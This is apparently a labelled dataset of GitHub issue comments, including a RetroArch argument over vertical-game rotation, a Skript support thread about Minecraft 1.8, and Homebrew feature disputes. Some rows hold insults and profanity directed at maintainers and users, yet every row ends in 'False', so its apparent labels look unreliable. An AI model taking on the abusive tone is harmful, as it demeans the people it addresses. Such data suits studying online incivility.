RetroArch/libretro/8551/480643111,8551,"I don't understand all of this, but it sounds very reasonable. Yes, it does seem grant2258 and I have been going in circles with this. I think I've provided enough info on the problem as it currently stands to work towards a solution, but since I'm not a programmer, I've probably done all I can by this point. ",,False
RetroArch/libretro/8551/480646624,8551,i agree with that  @friend  im sure @friend has some idea looking forward to seeing what he is going to do since he thinks there is an issue and what exactly is wrong as i cant see any issue at all with mame2003 or fba on libretro it both have the ability rotate or not rotate vertical games. It does it the same way as mainline fba and mame. So i wll digress im at a bit of a loss what you two seem to think the issue is is you want to maintain a 43 ratio you need to rotate the Monitor or physically force the aspect ratio to 43 when rotating and put up with the streched gfx ,,False
RetroArch/libretro/8551/480651030,8551,"The issue is that the behavior isn't consistent across cores and it's confusing as hell what is actually going on. There is the separate issue of what the default behavior should be for vertical games, which you seem to be caught up on. As of right now, MAME and FBA do the exact opposite thing with video_allow_rotate = true/false. And that's just two cores. Who knows what's going on with other cores; I haven't even had a chance to test them yet. TATE on and video_allow_rotate = true in MAME 2003 produces the same results as vertical mode on and video_allow_rotate = false in FBA. How does this make any sense? posting this for reference, read from this post down. ",,False
RetroArch/libretro/8551/480652403,8551," automatically switching the width/height for vertical oriented games is altering the output resolution, which is incorrect. The emulator should just output the resolution completely unaltered. Altering what is output by the emulator should always be done by the frontend, or through an option that the user has to manually select, but maybe that's just my opinion. The default should just be whatever the emulator spits out before you start doing stuff to it.  rotating the game is something that can be easily handled in the frontend without all of the confusion that currently exists  2 is something that can even be done automatically if desired by the user, through the frontend as explained by fr500.  the current method of automatically switching the height/width with vertical games will always result in scaling artifacts no matter what you set the aspect ratio to (unless it's a multiple of both 240 and 320). How can this be considered correct?  the current method of automatically switching the height/width of vertical games isn't even making things easier for the user in all cases, because video_allow_rotate = true/false isn't doing the same thing in all cores. The current method is just adding more confusion.   My brain is tired. Hopefully the thread I linked to above sheds some additional light on the problem. ",,False
RetroArch/libretro/8551/480656907,8551,"IMO Standalone FBA does things right. See  default it's sideways and 320x240, and there's a clearly labeled and easily accessed option to rotate video under the video menu. There should be a way to make RA work the same with all cores using one of the methods @friend described (it may need either a or b depending on what the core is doing). You could then add an easily accessed user option to automatically rotate vertical games. Or we could just endlessly debate what the default behavior should be when launching RA for the first time. ",,False
RetroArch/libretro/8551/480660954,8551,Ok here is the screenshots with you information the core geometry is reporting the right resolution  Ra ,,False
RetroArch/libretro/8551/480911698,8551,"I'm trying to figure out the point you're trying to make. If you're still arguing over what the default behavior should be when launching RA for the first time, I'm done with that conversation. ",,False
RetroArch/libretro/8551/480912425,8551,you rotate 320 x 240  image 90 degrees is becomes 240 x 320 thats as simple as you can describe it ,,False
RetroArch/libretro/8551/480913207,8551,Who is disputing that? What is the point of this? ,,False
RetroArch/libretro/8551/480914297,8551,,,False
RetroArch/libretro/8551/480914973,8551,"Yes, and how do you think what you just said contradicts this statement? I think there is a language barrier here that is preventing meaningful discussion. ",,False
RetroArch/libretro/8551/480915661,8551,that was you that it in your first post   your rotate an images the 90 degrees THE x /y swap ,,False
RetroArch/libretro/8551/480916855,8551,"Furthermore, the conversation has progressed quite a bit beyond the initial post. If you had been keeping up with the conversation you'd realize that the real issue is a lack of consistency between cores when it comes to the options related to video rotation. I am 100% done debating with you what the default behavior related to video rotation should be. It doesn't matter what the default behavior is. There are pros and cons to having rotation on or off by default and ultimately it's just an arbitrary decision that has to be made. What matters now is getting consistent behavior across cores and removing unnecessary knobs/dials that just lead to more confusion. @friend already outlined the solution and what he needs to implement it. ",,False
RetroArch/libretro/8551/480917580,8551,"I literally can't even tell what you're trying to say, here. I'm sorry, I really don't want to offend but the language barrier is just too much to deal with. I feel like you just consistently fail to understand the point being made and respond with irrelevant information most of the time and now I'm just wasting a lot of time trying to clarify things to you. I appreciate that you're trying to help, but we haven't been getting anywhere for a while. ",,False
RetroArch/libretro/8551/480921992,8551,i literally cant even figure your problem out the games will show sideways if they arent rotated. mame fba and lr cores do this. So i guess i leave it at this not wasting more time on you back tracking it not a good default leaving vertical games sideways. Something you claimed fba done ,,False
RetroArch/libretro/8551/480942598,8551,"did you even bother following the steps I listed to reproduce the bug? Or bother looking at the discussion at the libretro forums? There is most definitely something weird currently going on with video rotation and height/width being switched. It's not a problem present in all cores. Rotation behavior is not consistent across cores, for the nth time. That's probably the main problem. FFS, the screenshots I provided prove it! Facepalm. Here, to make things even clearer   ",,False
RetroArch/libretro/8551/480948593,8551,you rotated the image  what do you expect to happen? you screen shots prove nothing accept the video is rotated and not rotated.  fba and mame2003 create the same images ,,False
RetroArch/libretro/8551/480948833,8551,That's exactly what I expect to happen. Do you see that you're just not following what I'm saying very well? ,,False
RetroArch/libretro/8551/480949068,8551,"No they don't, and I've provided numerous examples demonstrating this. ",,False
RetroArch/libretro/8551/480949376,8551,I guess you dont get it when you rotate the video it becomes 34 proof is in the screen shot from fba rotated. it 240 x 230 as well not wasting any more time repeating this  ,,False
RetroArch/libretro/8551/480950665,8551,"Read this thread, from this post down to the end. Others clearly recognize that there is an issue.   just go away. You aren't getting it and I've reached the limit of my patience with this. ",,False
RetroArch/libretro/8551/480951120,8551,is fba wrong as well. Ive lost my patience with this as well. ,,False
RetroArch/libretro/8551/480958875,8551,"From the thread I just linked to, above So, yeah. It's not that you're wrong, it's just that you never quite understood what the problem was in the first place. Thankfully, the issue with FBA was recognized and corrected by BarbuDreadMon. ",,False
RetroArch/libretro/8551/480966333,8551,sending the wrong geometry form the core to fix it i would say thats out of spec and a patch. im sure mark will patch mame2003 and + up to send wrong info so it works in mame2003 and plus. Its trivial to do never the less i wont be changing is as its out of spec to whats really happening. no matter what your little numbers say the resolution is 240 x 320 when rotated ) ,,False
RetroArch/libretro/8551/481212456,8551,"i can explain the reasoning behind TATE mode core option in mame2003 the emulator sends two bits of information to the retroarch API; the games width and height, and how much it should be rotated so, for a typical arcade game, that would be width 320 height 240 rotation 0 (none) now, for a typical arcade vertical game (which were rendered sideways, and then the CRT was rotated when put in the cabinet), that information would be be width 240 height 320 rotation 1/3 (90/270 degrees) the issue is, retroarch uses the sent height and width regardless of whether it has been rotated or not. so, the emulator has to send the width and height of the game on the presumption that the rotation has happened. so, if you set  you will get an unwanted result ♠video_allow_rotate = truevideo_allow_rotate = falsevideo_allow_rotate = falsevideo_allow_rotate = false`)  (PS, screenshots from behaviour of mame2003 for a year or so ago, and retroarch 1.3.6 - this is what i originally designed TATE mode on - someone else rewrote TATE mode in 2003 so it instead does the rotations within the core itself - personally i think it should all be handled in the front end) so hopefully that shows the issue that TATE mode was trying to solve. IMO there's some better solutions 1) the API lets the core find out what video_allow_rotate is set to. that way, it can send the appropriate height/width for the situation. 2) rotation of 1 (90) or 3 (270deg) also flips the height/width. this would be my preference. i haven't really thought about the ramifications of these! ) ",,False
RetroArch/libretro/8551/481215666,8551,there is also some interplay with aspect_ratio that I've forgotten the details about. ,,False
RetroArch/libretro/8551/481292393,8551,the front end is still doing the rotating in mame2003 the fix is trivial your just dont swap change the x/y (like you should be doing in the core geometry).    rotate anything manually the geometory x/y in the menu doesnt change. ,,False
RetroArch/libretro/8551/481441626,8551,"No one ever disputed that the correct resolution is 240x320 when rotated. What's being disputed is whether or not all the cores are reporting the correct resolution when the image is rotated. You really are failing to grasp what's going on, here. Numerous people have since recognized the issue I'm describing and the issue in FBA was both recognized and fixed. The fact that you're holding firm on this even in spite of this indicates either a willful stubbornness on your part to admit that you're wrong, or just a complete misunderstanding on your part. There are numerous ambiguities and equivocations occurring in this conversation which make it very difficult to have a meaningful discussion with you. In fact, on more than one occasion you seem to think that I'm arguing for the exact opposite of the point I'm trying to make. The question of what the default rotation behavior should be for vertical games is almost trivial. It literally only matters the first time RA is launched, after which the user can set the behavior in the frontend. The MAIN issue is getting consistent behavior across all cores, regardless of what the default behavior should be. Now, if we're discussing the SEPARATE issue of what the default behavior should be or what is technically ""correct,"" I've already said what I'm going to say about that. You can either respond directly to the points I've made or continue ignoring them, either one is fine by me. Both standalone FBA and now also the FBA core do exactly what that they should be doing by enabling rotation in the core options and enabling vertical mode in the quick menu core options, you get the correct image, which looks like this  ",,False
RetroArch/libretro/8551/481445394,8551,@friend clearly in not debating with you and your screenshots anymore. you clearly dont understand geometry when a rotate happens. Im not wasting more time on it with you. No offence i posted a fix details for mame2003 and plus to send this bad geometry clearly you dont understand this at a level beyond screenshots. ,,False
RetroArch/libretro/8551/481451616,8551,As for tate mode in mame2003 and  plus is a ccw 90 degree rotate (it was renamed to what it is now from that) so if the arcade is 90 or 270 it will rotate the same way if the user has there screen rotated in a barcade/ servo/ stand setup . If you want a no rotate option youll need to post a github issue to get it added ,,False
RetroArch/libretro/8551/481465900,8551,why is this still going on. The problem was AR not being updated when using some rotation option (there are at least 3 ways to achieve rotation in RA) @friend I just noticed you are setting aspect ratio to 1. Why? aspect ratio should be core provided. ,,False
RetroArch/libretro/8551/481483688,8551,to sum it up its to do with core rotating an image with ra the cores info updates the rotated geom. RA doesnt like it or update geometry when you do a manual rotate itself.  So you have to return the original orientation even when you rotate through RA with the core. ,,False
RetroArch/libretro/8551/481484714,8551,all mame cores will need updates or ra should report rotated geometry. ,,False
RetroArch/libretro/8551/481500003,8551,"@friend You are completely hopeless. Several other devs agreed that there’s an issue, FBA dev already agreed that there is an issue and fixed it In FBA. To deny that there is an issue at this point is pretty much insane. I’m done talking to you. ",,False
RetroArch/libretro/8551/481501898,8551,"@friend, yeah I don’t know why this is even still a discussion. I’m at a loss. I use custom aspect ratios with RA because I overscan some games that scale to 1120 on the y axis. Switching it to core provided didn’t change what was going on with the reported width/height and rotation, as far as I could tell. Anyway, the issue in FBA was fixed yesterday so I think this issue can be closed; rotation behavior appears to be consistent, at least from the user’s perspective. The issue of how to best handle rotation is really a separate topic that probably warrants its own issue. ",,False
RetroArch/libretro/8551/481504574,8551,@friend ive already done the fix for 2003 and plus linked it and described the issue you are either stupid or argumentative or clueless about whats going on i think the latter ) ,,False
RetroArch/libretro/8551/481512478,8551,@friend Let's please keep this respectful at the very least. That last line was unnecessary. ,,False
SCCMdocs/MicrosoftDocs/1249/410476388,1249,"I search ""sccm create static computer collection"", knowing that a device collection is a list of computers that is dynamically generated but I want to make a static list that does not automatically change. Result Microsoft.com -&gt; ""How to Create a Static Collection""   &lt;- Promising blah blah blah VBScript or C# code it yourself. ........what?! SCCM is painful enough with absolutely no logic in how it is designed or functions.  Why does the Documentation have to suck even worse then the product!?  Document Details ⚠ Do not edit this section. It is required for docs.microsoft.com ➟ GitHub issue linking.  ID 19ae23b9-9a79-ce32-522b-e59697716bb3 Version Independent ID 83637444-e3ce-6c02-3617-d22842fb95b6 Content Create a Static Collection - Configuration Manager Content Source sccm/develop/core/clients/collections/how-to-create-a-static-collection.md Product configuration-manager GitHub Login @friend Microsoft Alias aaroncz  ",,False
SCCMdocs/MicrosoftDocs/1249/464136594,1249,"The Microsoft Open Source Code of Conduct, which outlines the expectations for community interactions in and around docs.microsoft.com, is designed to help ""provide a welcoming and inspiring community for all."" The content of this issue appears to be out of sync with the code of conduct. Thank you for closing it. ",,False
Skript/SkriptLang/1568/425498881,1568,"Use hastebin or pastebin for errors, because it's pretty hard to read right now. Also, why set the args as , when you can just make a command without args using♠command /die` Stack trace (roughly) for solving the issue ",,False
Skript/SkriptLang/1568/425499316,1568,"The error indicates ""Bukkit 1.8.8-R0.1-SNAPSHOT 28.09 "" This fork of Skript does not support anything lower than 1.9 ",,False
Skript/SkriptLang/1568/425534380,1568," As others have said, we don't support versions of Minecraft older than 1.9. You're also using an old version of Skript. You must be using the newest version of Skript to report issues (how else do we know if your issue is already fixed or not?) Your bug is due to the function your calling not being loaded yet. Make sure your  function is in a script that is loaded before the  script.  ",,False
Skript/SkriptLang/1568/364952194,1568,"hi each time i add this piece of code 28.09 172442 [Server] INFO titustitus98 issued server command /sk reload drakeconomy 28.09 172442 [Server] ERROR #!#!  28.09 172442 [Server] ERROR #!#! [Skript] Severe Error 28.09 172442 [Server] ERROR #!#! Could not load drakeconomy.sk 28.09 172442 [Server] ERROR #!#!  28.09 172442 [Server] ERROR #!#! If you're developing an add-on for Skript this likely means that you have done something wrong. 28.09 172442 [Server] ERROR #!#! If you're a server admin however please go to  172442 [Server] ERROR #!#! and check whether this error has already been reported. 28.09 172442 [Server] ERROR #!#! If not please create a new ticket with a meaningful title, copy &amp; paste this whole error into it (or use paste service), 28.09 172442 [Server] ERROR #!#! and describe what you did before it happened and/or what you think caused the error. 28.09 172442 [Server] ERROR #!#! If you think that it's a trigger that's causing the error please post the trigger as well. 28.09 172442 [Server] ERROR #!#! By following this guide fixing the error should be easy and done fast. 28.09 172442 [Server] ERROR #!#!  28.09 172442 [Server] ERROR #!#! Stack trace 28.09 172442 [Server] ERROR #!#! ch.njol.skript.SkriptAPIException Signature of function is null when return type is asked! 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.lang.function.FunctionReference.getReturnType(FunctionReference.java201) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.lang.function.ExprFunctionCall.getReturnType(ExprFunctionCall.java56) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.effects.EffChange.init(EffChange.java208) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.lang.SkriptParser.parse(SkriptParser.java249) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.lang.SkriptParser.parse(SkriptParser.java176) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.lang.Statement.parse(Statement.java61) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.ScriptLoader.loadItems(ScriptLoader.java754) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.command.Commands.loadCommand(Commands.java467) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.ScriptLoader.loadScript(ScriptLoader.java472) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.ScriptLoader.loadScripts(ScriptLoader.java271) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.SkriptCommand.onCommand(SkriptCommand.java167) 28.09 172442 [Server] ERROR #!#!     at org.bukkit.command.PluginCommand.execute(PluginCommand.java44) 28.09 172442 [Server] ERROR #!#!     at org.bukkit.command.SimpleCommandMap.dispatch(SimpleCommandMap.java141) 28.09 172442 [Server] ERROR #!#!     at org.bukkit.craftbukkit.v1_8_R3.CraftServer.dispatchCommand(CraftServer.java641) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.PlayerConnection.handleCommand(PlayerConnection.java1162) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.PlayerConnection.a(PlayerConnection.java997) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.PacketPlayInChat.a(PacketPlayInChat.java45) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.PacketPlayInChat.a(PacketPlayInChat.java1) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.PlayerConnectionUtils$1.run(SourceFile13) 28.09 172442 [Server] ERROR #!#!     at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java511) 28.09 172442 [Server] ERROR #!#!     at java.util.concurrent.FutureTask.run(FutureTask.java266) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.SystemUtils.a(SourceFile44) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.MinecraftServer.B(MinecraftServer.java715) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.DedicatedServer.B(DedicatedServer.java374) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.MinecraftServer.A(MinecraftServer.java654) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.MinecraftServer.run(MinecraftServer.java557) 28.09 172442 [Server] ERROR #!#!     at java.lang.Thread.run(Thread.java748) 28.09 172442 [Server] ERROR #!#!  28.09 172442 [Server] ERROR #!#! Version Information 28.09 172442 [Server] ERROR #!#!   Skript 2.2-dev25 28.09 172442 [Server] ERROR #!#!   Bukkit 1.8.8-R0.1-SNAPSHOT 28.09 172442 [Server] ERROR #!#!   Minecraft 1.8.8 28.09 172442 [Server] ERROR #!#!   Java 1.8.0_171 (Java HotSpot(TM) 64-Bit Server VM 25.171-b11) 28.09 172442 [Server] ERROR #!#!   OS Linux amd64 2.6.32-042stab127.2 28.09 172442 [Server] ERROR #!#! ` ",,False
Skript/SkriptLang/1568/425569223,1568,but my other leaderboard works fine ,,False
Skript/SkriptLang/1568/425569487,1568,"what does that have to add anything? this is super vague What code are you using for that 'other leaderboard', what version, etc. ",,False
Skript/SkriptLang/1568/425617408,1568,i use the exact same code with the exact same version ,,False
Skript/SkriptLang/1568/425619135,1568,and on the exact same server ,,False
Skript/SkriptLang/1568/425702576,1568,so what can i do? ,,False
Skript/SkriptLang/1568/425706161,1568,Update Skript and hope that it works on 1.8. This is a known bug in old releases. ,,False
Skript/SkriptLang/1568/425709572,1568,hi so i have updated to the latest recommended version of skript for 1.8 but bug perssists and here is my full log ,,False
Skript/SkriptLang/1568/425709620,1568,Use the bigger code blocks or hastebin or pastebin for errorrrs bcause this is hard to read ,,False
Skript/SkriptLang/1568/425709661,1568,"We do not officially support anything lower than 1.9, so you're on your own. ",,False
Skript/SkriptLang/1568/425709698,1568,thats not cool ,,False
Skript/SkriptLang/1568/425709747,1568,besides since most servers still use 1.8 you should support 1.8 ,,False
Skript/SkriptLang/1568/425709813,1568,Actually most servers use 1.12.2 ,,False
Skript/SkriptLang/1568/425709832,1568,"No, most servers support 1.12 or 1.13 and 1.8 should be left alone. You have plugins that enable 1.8 combat in 1.12 so why even bother using 1.8 ",,False
Skript/SkriptLang/1568/425709987,1568,idc about 1.9 compat mechanic and i simply can't just upgrade my server to a higher version just like that because some things might break and it took me months to set that server up ,,False
Skript/SkriptLang/1568/425710081,1568,"^ that there's no such thing as ""the latest recommended version of skript for 1.8"", just use the normal latest stable one, being dev37c, and report any bugs you have. We don't really support 1.8 but we try to keep it working (sometimes meaning that we just disable things that don't work on it) ",,False
Skript/SkriptLang/1568/425710214,1568,there is just go on the official skunity discord and  type in .download and it will show you it ,,False
Skript/SkriptLang/1568/425710224,1568,"you can't really expect us to spend the time on fixing the support for an old, long unsupported version (by Spigot too), just because ""some things might break"" (meaning you didn't even try) and you can't find the time to test stuff yourself. ",,False
Skript/SkriptLang/1568/425710290,1568,"♠Note that these resources are not maintained by me. If you notice something wrong with them, do not contact me.` - from the repo readme It's not as simple as just adding a line of code that says ""support 1.8 magically"". You're free to make a pull request adding support for 1.8, however if you're not willing to do this please do not just demand that. 1.8 is literally over 1000 days old and full of bugs. ",,False
Skript/SkriptLang/1568/425710301,1568,"well don't trust a bot on skUnity to be the 100% up-to-date official source of Skript news lol And about your error, do you have Umbaska on your server? ",,False
Skript/SkriptLang/1568/425710660,1568,i have updated my server to 1.12.2 but now everytime i join it kicks me and generates an Internal Exeption ,,False
Skript/SkriptLang/1568/425710698,1568,thank you for breaking my server ,,False
Skript/SkriptLang/1568/425710743,1568,thank you for not providing the stack trace ,,False
Skript/SkriptLang/1568/425710773,1568,then maybe you're using 1.8 plugins that dont work on 1.12 that do something with joining. idk ,,False
Skript/SkriptLang/1568/425710813,1568,that is why i didn't want to update to 1.12 ,,False
Skript/SkriptLang/1568/425710866,1568,so get the 1.12 versions of those plugins ,,False
Skript/SkriptLang/1568/425711806,1568,and i still can't join ,,False
Skript/SkriptLang/1568/425711966,1568,"This is the Skript issue tracker, for tracking issues happening in the supported versions of Minecraft. If you figure something out to make your server work on a supported version and the issue will still occur, please open a separate issue and post a gist.github.com link to the stacktrace along with the Spigot version, Skript version and a list of plugins, addons especially. If you need support with upgrading your server please ask in a more proper place like on the Spigot forums. And about your issue with Skript, I'm 95% sure it's caused by some outdated addon, please try without Umbaska to begin with, and if that doesn't help, ask on skUnity or on Skript Chat. Locking this not to hurt people's eyes more ",,False
WarBugs/WarEmu/13182/401558318,13182,Expected behavior and actual behavior No option to leave group - stupid crown over my head no option to disband or leave. Steps to reproduce the problem Screenshots/Videos or archive.org evidences  ,,False
WarBugs/WarEmu/13182/456299653,13182,So is it only the crown that disturbs? Can you join other groups or warbands? ,,False
WarBugs/WarEmu/13182/456443685,13182,Could not join other groups or Warbands. I just mentioned the crown as a visual indicator that I was still classed as being in a group. ,,False
WarBugs/WarEmu/13182/456564568,13182,Hm strange - thanks for the feedback. ,,False
WarBugs/WarEmu/13182/456614578,13182,Does this mean I get one of those bug report tokens for the griffon mount in Altdorf? ,,False
WarBugs/WarEmu/13182/456688522,13182,,,False
WarBugs/WarEmu/13182/456842512,13182,"Hey man what's wrong with you? Seriously. A simple no would work fine, you freak. Me and a friend reproduced this bug but forget trying to help you fix anything anymore, loser. ",,False
WarBugs/WarEmu/13182/456846002,13182,"We can not accept this kind of behavior. There are rules that you can find on forum. The answer of Sioding was not aggressive, while yours is. NEVER do it again. ",,False
WarBugs/WarEmu/13182/456862280,13182,I lock the conversation at this point. TBH It was just a quote from here ,,False
addons-frontend/mozilla/7757/424530262,7757,smartadblock was abusively rejected by erosman (a simple developer) in a case where the reviewer policy clearly states that more info should be requested. The extension has now been offline for 8hours? how has this guy been allowed to review extensions in the first place? ,,False
addons-frontend/mozilla/7881/432603741,7881,"Yeah, so... the whole Mozilla can go fuck itself. ",,False
angular-calendar/mattlewis92/493/311889495,493,If we define multiline event template the next view overlaps with the first ,,False
angular-calendar/mattlewis92/493/379213708,493,Please follow the issue template and attach a clear plunker etc that clearly reproduces the issue you're facing. Thanks! 😄 ,,False
angular-calendar/mattlewis92/493/379219477,493,"the problem is that you are fixing event height in week view, if we have multiline event template it bugs ",,False
angular-calendar/mattlewis92/493/379227878,493,"The default demo auto truncates long event titles to handle this, if you've used a custom template I have no way of knowing what your issue is because you've written some custom code that I cannot see, hence why I asked for the plunker. &lt;img width=""268"" alt=""screen shot 2018-04-06 at 13 27 53"" src="" bear in mind that I work on this project in my spare time for free. If your company is paying you to use other peoples free software, then you should spare a few minutes of your time to follow the guidelines when reporting issues on other peoples free software. I get dozens of issues opened across my projects, and I can only spare the time to answer those that provide specific reproductions of issues. If this isn't acceptable to you, then you are more than welcome to build your own calendar component that functions exactly how you would like it to. If it's all the same to you, I would not like to engage with you further as this is a waste of energy on both sides. Best of luck with completing your project!  😄 ",,False
blueprint/palantir/2875/354864726,2875,"Apologies to any contributors who aren't employees of Palantir. But to those that are Please find jobs elsewhere and stop helping Palantir do horrible things. Also, stop using my tools (such as Lerna), I don't support you, and I don't want my work to benefit your awful company. ",,False
brew/Homebrew/3859/301750246,3859,"I just did ""brew update"" which did the following ==&gt; Migrating python3 to python ==&gt; Unlinking python3 ==&gt; Unlinking python ==&gt; Moving python3 children ==&gt; Linking python I'm sure that python3 makes sense to use and is the future, but why is this change made without  prompting the user for input? This is potentially a breaking change that can affect systems. Furthermore the semantics of running brew update is now blurred; what am I to expect when running the command? ",,False
brew/Homebrew/3859/369908381,3859,"This changed was announced in January  you need Python 2, ",,False
brew/Homebrew/3859/369908976,3859,"Also please always, always read and fill out the issue template. It tells you to do so. No Homebrew change ever prompts the user for input. ",,False
brew/Homebrew/3859/369960418,3859,"Furthermore the semantics of running brew update is now blurred; what am I to expect when running the command? I'd love to know the answer to this as well. How should a user guard against unexpected breaking changes? And once broken, how should users proceed and get back to getting work done? ",,False
brew/Homebrew/3859/369962918,3859,"In progressing levels of effort (the lowest level of which would have been sufficient in this case)  read our blog posts through the RSS feed or our Twitter feed (or the front page of Hacker News where they normally end up) watch our repository and read pull requests that seem relevant to your organisation watch our repository and test pull requests that seem relevant to your organisation before they are merged create your own tap or fork of Homebrew/homebrew-core for formulae you wish to never be changed  That's on you to figure out. We're volunteers running a project that you're using to ""get work done"" i.e. make money. Our license clearly states we disclaim all warranties and the software is available as-is. Note, your organisation could consider donating money to our project which would provide more resources to make it easier for us to do additional automated testing. ",,False
brew/Homebrew/3859/369964089,3859,"And to be clear This is definitely a breaking change. That's why we gave you a month and a half's notice on our primary communication mechanisms (blog on our homepage, our Twitter) to adapt to this change. If you did not do so that's on you, not us, sorry. ",,False
brew/Homebrew/3859/369965787,3859,@friend Would you like to explain your 👎 or would you like to just demotivate the maintainers to this project through drive-by negativity? ,,False
brew/Homebrew/3859/369971459,3859,"I think you are coming off angry and arrogant in your replies to this.  I think this is an issue that should be handled, and the users helped, with less arrogance and negativity from your side as well. ",,False
brew/Homebrew/3859/369981375,3859,"I see no mention of breaking changes or remediation steps in that blog post. If said blog is the only communication mechanism for breaking changes, that failure to communicate is on you. ",,False
brew/Homebrew/3933/305723767,3933,"In the past, multiple people have requested that some kind of hooks functionality be added to Homebrew. This would unnecessarily complicate Homebrew in my opinion, but the rationale behind those requests has not been given adequate consideration IMO. Rather than a generic hooks system, I would like to propose that Homebrew maintains ~/.Brewfile and keeps it up to date whenever new taps, formula, or casks are installed. This is the primary reason for all of the previous hooks requests, and I think it's a pretty legitimate one. This would allow anyone tracking their dotfiles in version control to simply add ~/.Brewfile and commit it whenever it changes. Currently, the process to do this is a bit annoying, because after every brew command, I need to manually run . It works, but it's a kludge. I'm not sure that this is relevant to 90% of Homebrew users, but it also doesn't harm anyone that doesn't want the functionality. They can simply ignore the file. I would also argue that anyone that currently has this file in place is probably already manually running the aforementioned command manually, and would be grateful for the automation. I'm happy to implement this if a PR would be welcomed. ",,False
brew/Homebrew/3933/373634148,3933,Homebrew has historically (and correctly in my opinion) never written any dotfiles. As you mention this is still possible with some manual work that I think is more desirable and could be wrapped with a script or function that calls  after each  run. Sorry but thanks. ,,False
brew/Homebrew/3933/373748261,3933,"I am not the first to suggest this, nor will I be the last. I really don't understand your rationale here, but would you be open to an opt-in approach via an environment variable or something? It's extremely unlikely that I'm going to write a script that wraps all of the brew commands and run  after some of them when it's a problem that could be very trivially solved in Homebrew itself. ",,False
brew/Homebrew/3933/373758084,3933,Can you link to the other suggestions? Thanks! That's up to you. ,,False
brew/Homebrew/3933/373773643,3933,Because it does not pass the “relevant to 90% of users” barrier. Adding a feature does not just mean writing the code. It means maintaining it (code) and supporting it (issues); dealing with every other thing that breaks because of it; and considering when weighing other features that may clash with it (even if in usability). ,,False
brew/Homebrew/3933/373771217,3933,Also trivial ,,False
brew/Homebrew/3933/373794841,3933,"@friend Please read, or re-read, our Code of Conduct and adjust your future communication accordingly. ",,False
brew/Homebrew/3933/373779036,3933,"Yeah, I'm aware. I maintain a widely used project as well. IMO, it still doesn't make sense to make each individual user that is affected by this problem solve it individually, even if the method for doing so is easy. ",,False
brew/Homebrew/3933/373780120,3933,"It does make sense in the case where it's relatively easy to do so, users cannot currently agree on how this should behave and we have a very low number of requests proportional to Homebrew (or even s) users. ",,False
brew/Homebrew/3933/373767373,3933,"I found these four very quickly. Hard to track them down because of the repository changes, but note that you (@friend) mentioned in  that it had been requested a few times before, so this can't be news to you.   if you want to do it correctly. It's not necessary to dump the Brewfile after  for instance. Personally, I would rather not incur the 2 second penalty on every brew command. Yes, this can be solved outside of Homebrew, but why should it not be Homebrew's issue? It's a point of friction that can be solved with zero negative consequences. ",,False
brew/Homebrew/3933/373780912,3933,Another option have launchd run brew bundle dump for you once an hour and forget about this forever. ,,False
brew/Homebrew/3933/373784521,3933,"TIL kludgy workarounds are an acceptable substitute for 20 lines of well tested, widely used code. I seriously cannot understand that mindset. You have refused to add ways for users to extend Homebrew, and you have refused to add specific functionality that users would add in third party extensions if they were able. You have essentially mandated that kludgy workarounds are the only way to get this functionality, and that's really not a great situation. If that's the barrier, then reopen this issue and let users discuss it. Tweet it out and ask for feedback. People aren't going to see/engage with it if it's closed. I would argue that literally anyone using brew bundle would benefit from this feature, even if they haven't explicitly requested it. ",,False
brew/Homebrew/3933/373761516,3933,Solving this in HB itself is less trivial than the alternative ♠ newbrew() {   brew ${@}   brew bundle dump --file=~/.Brewfile --force } ,,False
brew/Homebrew/3933/373806979,3933,"Wrapping a Unix tool with a Unix shell script is an acceptable substitute for an unknown quantity or quality of unwritten code that would be used by a minority of Homebrew's users. Untrue. Users can use and build external commands which can be shared in taps (along with formulae). That's not how we run our issue tracker, run yours how you choose. I use, have contributed more to it than anyone else and have maintained longer than anyone else both this repo and Homebrew/homebrew-bundle. I've also rolled out Homebrew/homebrew-bundle to hundreds of developers in an organisation who use it daily and built tools on top of it used by many other organisations. I would not use this feature and most of the aforementioned folks would not either. Finally, I wish I'd listened to my gut earlier and, like @friend has done, pointed you to our Code of Conduct. Unfortunately you seem unable to conduct yourself in a polite fashion so I'm uninterested in continuing this conversation. I hope that we're able to work together on a PR or issue in future but please note that continued violations of our Code of Conduct will result you being blocked from the Homebrew organisation. ",,False
brew/Homebrew/5687/407612123,5687,  A detailed description of the proposed feature The current behavior of  is to remove all other installed versions. If a package has previously been installed using  then  should not remove those. The motivation for the feature I'm no longer able to back down to  or reinstall it using  and the current version feels slower perceptually during the development workflow. I'm unable to debug. I also have  signified as the minimum required version for a design system I need to be able to quickly toggle back and forth between versions of this pre-1.0.0 software. How the feature would be relevant to at least 90% of Homebrew users Whatever happened to Pareto? What alternatives to the feature have been considered I could stop using using Homebrew and run the Docker container I created to build from source. ,,False
brew/Homebrew/5687/461349912,5687,,,False
brew/Homebrew/5687/461360141,5687,"We do not support installing older versions. You can use  to add it to your own tap. That's not a design principle we're adopting. Please fill out the template in future. Again, this is not helpful language. It makes no difference to us whether you choose to use Homebrew or not use whatever is best for you. You may be interested in the  variable. Please ensure you read  in future before creating issues, thanks. ",,False
brew/Homebrew/5687/461374145,5687,This could indeed be helpful. But I would expect 99.7 percent of developers don't want dependencies they expressly installed removed without a simple prompt for cleanup especially if Homebrew can't maintain historical packages and doesn't afford its users a method of recovery. P.s. Please work on your soft skills. ,,False
